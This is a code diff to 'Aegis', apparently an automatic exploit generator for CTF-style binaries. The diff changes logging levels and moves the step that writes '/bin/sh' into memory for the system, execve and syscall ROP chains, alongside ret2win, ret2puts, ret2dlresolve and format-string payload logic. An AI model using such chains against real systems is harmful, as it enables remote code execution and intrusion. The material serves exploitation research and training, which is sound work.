@@ -96,42 +96,47 @@ class Aegis:
 
         else: 
 
-            if not string:
-                self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
-
             # Check if one call functions are in the binary
             if win_gadget:
-                aegis_log.info(f"Setting up return to win with gadget")
+                aegis_log.debug(f"Setting up return to win with gadget")
                 if self.failed:
                     self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                 self.against.chain += p64(win_gadget)
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "win":
-                aegis_log.info(f"Setting up return to win with function")
+                aegis_log.debug(f"Setting up return to win with function")
                 self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "system":
-                aegis_log.info(f"Setting up return to system")
+                aegis_log.debug(f"Setting up return to system")
+                if not string:
+                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string])
                     self.against.exploit = self.against.padding + self.against.chain
             elif function == "execve":
-                aegis_log.info(f"Setting up return to execve")
+                aegis_log.debug(f"Setting up return to execve")
+                if not string:
+                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
+
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
                     self.against.exploit = self.against.padding + self.against.chain
             elif function == "syscall":
-                aegis_log.info(f"Setting up return to syscall")
+                aegis_log.debug(f"Setting up return to syscall")
+
+                if not string:
+                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
+
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
                     self.against.exploit = self.against.padding + self.against.chain
             else:
                 if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
-                    aegis_log.info(f"Setting up return to puts")
+                    aegis_log.debug(f"Setting up return to puts")
                     self.against.chain = self.against.rop_ret2puts()
-                # Check for ret2dlresolve
                 elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
-                    aegis_log.info(f"Setting up return to dlresolve")
+                    aegis_log.debug(f"Setting up return to dlresolve")
                     self.against.chain = self.against.rop_chain_dlresolve()
             self.exploit()
                 
@@ -142,23 +147,23 @@ class Aegis:
 
     def exploit(self):
         """Create and run exploit using Against module."""
-        aegis_log.info(f"Setting up exploit")
+        aegis_log.debug(f"Setting up exploit")
         chain_len = len(self.against.chain)
 
         if chain_len > 0:
-            aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
         else:
-            aegis_log.info(f"Sending format string payload {self.against.format_exploit}")
+            aegis_log.debug(f"Sending format string payload {self.against.format_exploit}")
 
         if args.GDB:
             self.against.process = self.against.start("GDB")
             self.against.send_exploit()
 
-            aegis_log.info(f"Adding ret to chain")
+            aegis_log.debug(f"Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
                 
             chain_len = len(self.against.chain)
-            aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
             self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
 
             self.against.process = self.against.start("GDB")
@@ -170,7 +175,7 @@ class Aegis:
             if self.against.verify_flag() == False:
                 ret = p64(self.rop.find_gadget(["ret"])[0])
                 chain_len = len(self.against.chain)
-                aegis_log.info(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
+                aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
                 self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
                 self.against.process = self.against.start("")
                 self.against.send_exploit()
@@ -249,7 +254,7 @@ if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-    logging.getLogger("aegis_log").setLevel(logging.INFO)
+    logging.getLogger("aegis_log").setLevel(logging.DEBUG)
     parser = argparse.ArgumentParser( 
         prog = "Aegis", 
         description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
